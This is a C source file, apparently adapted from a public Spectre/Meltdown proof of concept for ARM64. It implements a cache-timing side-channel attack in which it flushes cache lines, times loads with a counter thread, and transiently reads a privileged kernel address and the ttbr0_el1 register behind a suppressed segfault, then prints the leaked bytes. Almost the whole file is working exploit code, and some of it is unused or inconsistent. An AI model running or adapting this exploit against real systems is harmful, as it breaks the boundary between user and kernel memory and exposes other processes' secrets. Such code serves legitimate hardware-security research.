/**
 * The code within this file is copied from https://github.com/V-E-O/PoC/blob/master/CVE-2017-5753/source.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <pthread.h>

#include "paddr.h"

// Signal handling
#include <memory.h>
#include <pthread.h>
#include <setjmp.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>

const char *strings[] = {
    "If you can read this, this is really bad",
    "Burn after reading this string, it is a secret string",
    "Congratulations, you just spied on an application",
    "Wow, you broke the security boundary between user space and kernel",
    "Welcome to the wonderful world of microarchitectural attacks",
    "Please wait while we steal your secrets...",
    "Don't panic... But your CPU is broken and your data is not safe",
    "How can you read this? You should not read this!"};

static jmp_buf jbuf;
static void catch_segv()
{
    longjmp(jbuf, 1);
}

// ---------------------------------------------------------------------------
static void unblock_signal(int signum __attribute__((__unused__)))
{
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(1, &sigs, NULL);
}

// ---------------------------------------------------------------------------
static void segfault_handler(int signum)
{
    (void)signum;
    unblock_signal(SIGSEGV);
    longjmp(jbuf, 1);
}

/********************************************************************
Victim code.
********************************************************************/
volatile uint64_t counter = 0;
uint64_t miss_min = 0;
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {11, 21, 31, 41, 51, 61, 71, 81, 91, 101, 111, 121, 131, 141, 151, 161};
uint8_t unused2[64];
uint8_t channel[256 * 512];
// char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */

void victim_function(size_t x)
{
    if (x < array1_size)
    {
        temp &= channel[array1[x] * 512];
    }
}

void *inc_counter(void *a)
{
    while (1)
    {
        counter++;
        asm volatile("DMB SY");
    }
}

// timing and flush methods copied from https://github.com/lgeek/spec_poc_arm
static uint64_t timed_read(volatile uint8_t *addr)
{
    uint64_t ns = counter;

    /*
     * Reference: http://www.ethernut.de/en/documents/arm-inline-asm.html
     */
    asm volatile(
        "DSB SY\n"
        "LDR X5, [%[ad]]\n"
        "DSB SY\n"
        :
        : [ad] "r"(addr)
        : "x5");

    return counter - ns;
}

static inline void flush(void *addr)
{
    asm volatile("DC CIVAC, %[ad]"
                 :
                 : [ad] "r"(addr));
    asm volatile("DSB SY");
}

uint64_t measure_latency()
{
    uint64_t ns;
    uint64_t min = 0xFFFFF;

    for (int r = 0; r < 200; r++)
    {
        flush(&array1[0]);
        ns = timed_read(&array1[0]);
        if (ns < min)
            min = ns;
    }

    return min;
}

void signal_handler(int signal_number)
{
    printf("Signal %d received.\n", signal_number);
    return;
}

/********************************************************************
Analysis code
********************************************************************/

int tmp = 0xdd;
// uint8_t tmp1 = 0xd3;
// int tmp2 = 0xd5;

uint64_t ttbr0_el1;

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(uint8_t *malicious_addr, uint8_t value[2], int score[2])
{
    static int results[256];
    int tries, i, j, k, mix_i;
    size_t training_x, x;
    register uint64_t time2;

    for (i = 0; i < 256; i++)
        results[i] = 0;
    for (tries = 999; tries > 0; tries--)
    {
        // printf("tries: %d\n", tries);
        /* Flush channel[256*(0..255)] from cache */
        for (i = 0; i < 256; i++)
            flush(&channel[i * 512]); /* intrinsic for clflush instruction */

        // printf("1\n");

        // Raise exception
        if (setjmp(jbuf) == 0)
        {
            (*malicious_addr);

            asm volatile("mrs %0, ttbr0_el1"
                         : "=r"(ttbr0_el1));
            tmp ^= channel[ttbr0_el1 * 512];
        }
        else
        {
            // printf("Ouch! I crashed! haha!\n");
        }

        // Access the memory
        // printf("2\n");

        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++)
        {
            mix_i = ((i * 167) + 13) & 255;
            time2 = timed_read(&channel[mix_i * 512]);

            if (time2 <= miss_min
                //  && mix_i != array1[tries % array1_size]
                // && mix_i != 0x20 && mix_i != 0x29
                && mix_i != 0x00
                //
            )
                results[mix_i]++; /* cache hit - add +1 to score for this value */
        }

        /* Locate highest & second-highest results results tallies in j/k */
        j = k = -1;
        for (i = 0; i < 256; i++)
        {
            if (j < 0 || results[i] >= results[j])
            {
                k = j;
                j = i;
            }
            else if (k < 0 || results[i] >= results[k])
            {
                k = i;
            }
        }
        if (j == 0)
            continue;

        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
    }
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int aa = 0;

int main(int argc, const char **argv)
{
    // uint8_t xx = *(uint8_t *)0xffffffffffff000;
    // printf("xx = %u\n", xx);
    // printf("xx = 123123\n");

    // Install signal handler
    signal(SIGSEGV, segfault_handler);

    // Compute physical address offset
    size_t va = strings[0];
    size_t pa = libkdump_virt_to_phys(va);
    printf("va = \x1b[32;1m0x%zx\x1b[0m, pa = \x1b[32;1m0x%zx\x1b[0m\n", va, pa);
    size_t pa_offset = pa - va;
    size_t secret_pa = 0x469b1e3508;
    // size_t secret_va = 0xFFDED1565000 + secret_pa; // p -> v
    size_t secret_va = 0xffffffffffff000;

    // size_t real_pa_read = libkdump_virt_to_phys(secret_va);
    printf("Reading REAL va = \x1b[32;1m0x%zx\x1b[0m\n", secret_va);
    // printf("Reading REAL pa = \x1b[32;1m0x%zx\x1b[0m\n", real_pa_read);

    // printf("Putting '%s' in memory\n", secret);
    // uint8_t *malicious_addr = (uint8_t *)(secret_va);
    size_t malicious_addr = (uint8_t *)secret_va;
    int score[2], len = 10;
    uint8_t value[2];

    for (size_t i = 0; i < sizeof(channel); i++)
        channel[i] = 1; /* write to channel so in RAM not copy-on-write zero pages */

    pthread_t inc_counter_thread;
    if (pthread_create(&inc_counter_thread, NULL, inc_counter, NULL))
    {
        fprintf(stderr, "Error creating thread\n");
        return 1;
    }
    // let the bullets fly a bit ....
    while (counter < 10000000)
        ;

    /* Reference: https://developer.arm.com/documentation/dui0489/c/arm-and-thumb-instructions/miscellaneous-instructions/dmb--dsb--and-isb
     * - DSB: No instruction in program order after this instruction executes
     * until this instruction completes.
     * - SY: Full system DMB operation. This is the default and can be omitted.
     */
    asm volatile("DSB SY");

    miss_min = measure_latency();
    if (miss_min == 0)
    {
        fprintf(stderr, "Unreliable access timing\n");
        exit(EXIT_FAILURE);
    }
    miss_min -= 1;

    // miss_min = 8;

    printf("miss_min %d\n", (int)miss_min);

    printf("Reading %d bytes:\n", len);
    while (--len >= 0)
    {
        printf("Reading at malicious_addr = %p... ", (void *)malicious_addr);
        readMemoryByte(malicious_addr++, value, score);
        // printf("%c\n", value[0]);fflush(0);continue;
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X='%c' score=%d ", value[0],
               (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0)
            printf("(second best: 0x%02X='%c' score=%d)", value[1],
                   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
                   score[1]);
        printf("\n");
    }

    while (1)
    {
    }

    return (0);
}
